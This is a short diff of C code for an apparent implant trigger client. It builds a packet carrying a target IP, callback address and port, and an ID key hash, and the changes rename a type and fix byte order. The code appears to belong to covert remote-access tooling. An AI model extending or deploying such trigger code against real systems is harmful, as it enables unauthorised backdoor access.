@@ -35,12 +35,12 @@ extern pthread_mutex_t tlock;
 static void print_usage ();
 static void parse_options (struct trigger_params *t_info, trigger_info * ti);
 static void print_input_args (trigger_info * ti);
-int trigger_info_to_payload (payload * p, trigger_info * ti);
+int trigger_info_to_payload (Payload * p, trigger_info * ti);
 //************************************************************
 void *
 trigger_start (void *arg)
 {
-	payload p;
+	Payload p;
 	trigger_info ti;
 	int fd;
 	int rv;
@@ -62,7 +62,7 @@ trigger_start (void *arg)
 	fd = open ((char *) dieselt_udev_rand, O_RDONLY);	// Open /dev/urandom
 
 	// Fill payload structure with random data
-	if ((rv = read (fd, &p, sizeof (payload))) != sizeof (payload)) {
+	if ((rv = read (fd, &p, sizeof (Payload))) != sizeof (Payload)) {
 		perror (" read()");
 		debug (" buffer not filled from /dev/urandom\n");
 		exit (-1);
@@ -249,6 +249,7 @@ parse_options (struct trigger_params *t_info, trigger_info * ti)
 
 	// extract the target IP
 	inet_pton (AF_INET, t_info->target_ip, &(ti->target_addr));
+	memcpy(&(ti->idKey_hash), &(t_info->idKey_hash), ID_KEY_HASH_SIZE);
 }
 
 
@@ -357,7 +358,7 @@ parse_trig (const char *str, uint32_t * trig)
  * \todo Have this function return a void or integrate it into code above.
  */
 int
-trigger_info_to_payload (payload * p, trigger_info * ti)
+trigger_info_to_payload (Payload * p, trigger_info * ti)
 {
 	uint16_t crc;
 
@@ -365,12 +366,12 @@ trigger_info_to_payload (payload * p, trigger_info * ti)
 		return FAILURE;
 	}
 
-	p->callback_addr = ti->callback_addr;
-	p->callback_port = ti->callback_port;
+	p->callback_addr = htonl(ti->callback_addr);
+	p->callback_port = htons(ti->callback_port);
 	memcpy (&(p->idKey_hash), &(ti->idKey_hash), ID_KEY_HASH_SIZE);
 
 	p->crc = 0;
-	crc = tiny_crc16 ((const uint8_t *) p, sizeof (payload));
+	crc = tiny_crc16 ((const uint8_t *) p, sizeof (Payload));
 	crc = htons (crc);
 	p->crc = crc;
 
